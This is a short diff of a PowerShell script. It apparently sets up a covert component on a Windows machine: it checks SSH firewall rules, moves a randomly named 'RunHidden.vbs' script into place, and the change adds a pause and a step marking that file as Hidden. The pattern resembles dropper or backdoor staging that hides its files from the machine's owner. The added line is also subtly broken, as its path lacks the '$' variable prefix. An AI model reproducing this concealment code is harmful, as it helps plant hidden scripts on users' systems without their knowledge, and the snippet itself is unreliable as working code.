@@ -82,7 +82,10 @@ Get-NetFirewallRule -Name *ssh*
 
 # Move RunHidden.vbs and Pause
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
+
 Start-Sleep -Seconds 30
+
+Set-ItemProperty -Path "initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
 
 # Create New Directory and Change to It
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
